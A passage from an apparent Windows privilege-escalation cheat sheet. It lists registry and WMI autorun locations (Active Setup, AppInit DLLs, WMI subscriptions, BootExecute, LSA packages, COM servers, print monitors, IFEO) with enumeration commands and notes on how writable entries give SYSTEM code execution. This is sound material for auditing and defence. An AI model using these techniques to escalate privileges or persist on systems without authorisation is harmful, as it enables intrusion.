```powershell
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components' | ForEach-Object { Get-ItemProperty $_.PSPath } | Select-Object PSChildName, StubPath | Where-Object {$_.StubPath -ne $null}
```

- In CMD:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /f StubPath
```

> [!bug] If you can modify a registered `StubPath` registry value or overwrite its referenced executable target, the modified command executes during Active Setup processing in the logging-on user's security context.

### AppInit DLLs (`AppInit_DLLs`)

- When AppInit DLL loading is enabled, configured DLLs load into applicable user-mode processes that consume `User32.dll`.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows` (on 64-bit Windows, also check 32-bit applications under `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows`).
- Requires `LoadAppInit_DLLs` set to `1`. AppInit DLL loading is disabled when Secure Boot is enabled on Windows 8 and later.

- Query AppInit DLL configuration using PowerShell:

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' | Select-Object AppInit_DLLs, LoadAppInit_DLLs
```

- In CMD:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs
```

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs
```

> [!bug] If AppInit DLL loading is enabled and Secure Boot does not disable the mechanism, a writable configured DLL path or registry value causes your DLL to load into processes consuming `User32.dll`.

> [!note] See [`AppInit DLLs and Secure Boot — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls).

### WMI permanent event subscriptions

- WMI permanent event subscriptions trigger standard event consumers in response to WMI events. On modern Windows, `CommandLineEventConsumer` launches its process under `NT AUTHORITY\SYSTEM`.
- Subscriptions consist of three WMI classes under `root\subscription`: `__EventFilter` (WQL query), `CommandLineEventConsumer` or `ActiveScriptEventConsumer` (execution handler), and `__FilterToConsumerBinding`. Creating or configuring a `CommandLineEventConsumer` requires administrative rights.

- Query permanent event subscriptions using PowerShell:

```powershell
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter
Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer
Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding
```

- In CMD:

```powershell
wmic /namespace:\\root\subscription path __EventFilter get Name, Query
wmic /namespace:\\root\subscription path CommandLineEventConsumer get Name, CommandLineTemplate
```

> [!bug] If an existing privileged subscription (such as a `CommandLineEventConsumer`) references an executable or script that you can modify, altering that file grants code execution under `SYSTEM` when any event represented by the configured WQL filter occurs.

> [!note] See [`CommandLineEventConsumer class — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/wmisdk/commandlineeventconsumer).

### Session Manager boot execution (`BootExecute`)

- Before user-mode services start during system boot, Session Manager (`smss.exe`) processes native applications specified in `BootExecute`.
- `BootExecute` is a `REG_MULTI_SZ` registry value under `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager` (default: `autocheck autochk *`).

- Query `BootExecute` configuration using PowerShell:

```powershell
Get-ItemPropertyValue 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' -Name BootExecute
```

- In CMD:

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute
```

> [!bug] If an extreme ACL misconfiguration grants write access to the `BootExecute` value or a referenced native binary, successful native-image execution occurs during early Session Manager initialization before interactive logon under `SYSTEM`. `BootExecute` targets must be native subsystem binaries, not standard Win32 executables.

### LSA security and authentication packages

- The Local Security Authority (`lsass.exe`) loads authentication and security packages registered under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` (`Authentication Packages`, `Security Packages`, `Notification Packages`).

- Query registered LSA packages using PowerShell:

```powershell
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' | Select-Object 'Authentication Packages', 'Security Packages', 'Notification Packages'
```

- In CMD:

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages"
```

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
```

> [!bug] If a permission flaw allows altering the LSA registry configuration or a referenced package DLL, the DLL can be loaded into `lsass.exe` under `SYSTEM`. Note that modern protections such as LSA protection (Protected Process Light / PPL) and Credential Guard restrict unauthorized package loading.

### Explorer shell extensions and COM registrations

- Windows Explorer and other system processes load COM components (shell extensions, context menus, icon overlays) via `CLSID` registrations under `HKLM\SOFTWARE\Classes\CLSID` or per-user overrides under `HKCU\Software\Classes\CLSID`.

- Enumerate registered COM class servers using PowerShell:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\Classes\CLSID' -ErrorAction SilentlyContinue | ForEach-Object {
    $clsid = $_.PSChildName
    $inproc = Get-ItemProperty "$($_.PSPath)\InprocServer32" -ErrorAction SilentlyContinue
    if ($inproc) { [PSCustomObject]@{ CLSID = $clsid; Server = $inproc.'(default)' } }
}
```

- In CMD:

```powershell
reg query "HKLM\SOFTWARE\Classes\CLSID" /s /f InprocServer32
```

> [!bug] If an affected privileged process resolves a COM class through a registration or server path you can influence, a writable `InprocServer32` or equivalent server path provides code execution in that process's security context. Per-user `HKCU` overrides do not automatically apply to elevated processes running under UAC restrictions.

### Print monitors

- The Print Spooler service (`spoolsv.exe`, running as `SYSTEM`) loads print monitor DLLs registered under `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors`.

- Query registered print monitors using PowerShell:

```powershell
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors' | ForEach-Object { Get-ItemProperty $_.PSPath }
```

- In CMD:

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors" /s
```

> [!bug] If the Print Spooler service is running and write permissions permit modifying a registered monitor DLL file or adding a monitor entry to the registry, restarting the Print Spooler service causes registered monitors to be loaded under `SYSTEM`.

### Image File Execution Options (IFEO) and Silent Process Exit

- **Mechanism:** IFEO supports per-image debugger configuration through registry entries for executable image names under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<ExecutableName>`. When the target image runs, Windows launches the configured `Debugger` executable instead.



## References and further reading

- [`Autoruns — Microsoft Sysinternals`](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
- [`Run and RunOnce Registry Keys — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
- [`AccessChk — Microsoft Sysinternals`](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [`cmd.exe — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)
- [`about_Profiles — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
- [`AppInit DLLs and Secure Boot — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls)
- [`CommandLineEventConsumer class — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/commandlineeventconsumer)
- [`Task Scheduler schema — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-schema)
- [`schtasks — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)
- [`Get-ScheduledTask — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask)
- [`Winlogon and Userinit logon behavior — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthn/msgina-dll-features)
- [`Registry Run Keys / Startup Folder — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1547/001/)
- [`Privilege Escalation with Autoruns — HackTricks`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html)